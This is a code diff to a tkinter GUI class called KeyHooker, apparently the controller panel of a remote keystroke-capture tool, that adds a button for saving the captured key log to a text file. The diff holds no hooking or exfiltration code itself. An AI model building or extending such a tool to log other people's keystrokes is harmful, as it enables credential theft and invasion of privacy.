@@ -1,6 +1,7 @@
-from tkinter import ttk, messagebox
+from tkinter import ttk, messagebox, filedialog
 import tkinter.scrolledtext as tkst
 import tkinter as tk
+import os
 
 class KeyHooker:
     def __init__(self, parent, conn):
@@ -25,7 +26,23 @@ class KeyHooker:
         self.print_button = ttk.Button(
             self.parent, text='Print', command=self.handle_print_button
         )
+        self.save_button = ttk.Button(
+            self.parent, text='Save', command=self.handle_save_button
+        )
         self.key_log = tkst.ScrolledText(self.parent, state=tk.DISABLED)
+
+    def handle_save_button(self):
+        file = filedialog.asksaveasfile(
+            title='Save key log', mode='w',
+            initialfile = 'Untitled.txt', defaultextension=".txt",
+            filetypes=[("All Files","*.*"),("Text Documents","*.txt")]
+        )
+        if file is None:
+            return
+        else:
+            file.write(self.key_log.get(1.0, tk.END).replace(os.linesep, '\n'))
+            file.close()
+
 
     def handle_print_button(self):
         if not self.conn.client.send_obj('PRINT'):
@@ -102,7 +119,8 @@ class KeyHooker:
         self.parent.columnconfigure(index=1, weight=1)
         self.parent.columnconfigure(index=2, weight=1)
         self.parent.columnconfigure(index=3, weight=1)
-        self.parent.columnconfigure(index=4, weight=30)
+        self.parent.columnconfigure(index=4, weight=1)
+        self.parent.columnconfigure(index=5, weight=10)
 
         # Put tkinter widgets into grid
         self.hook_button.grid(
@@ -117,6 +135,9 @@ class KeyHooker:
         self.clear_button.grid(
             row=0, column=3, padx=(5, 5), pady=(5, 5), sticky="nsew"
         )
+        self.save_button.grid(
+            row=0, column=4, padx=(5, 5), pady=(5, 5), sticky="nsew"
+        )
         self.key_log.grid(
-            row=1, column=0, columnspan=5, padx=(5, 5), pady=(5, 5), sticky="nsew"
+            row=1, column=0, columnspan=6, padx=(5, 5), pady=(5, 5), sticky="nsew"
         )
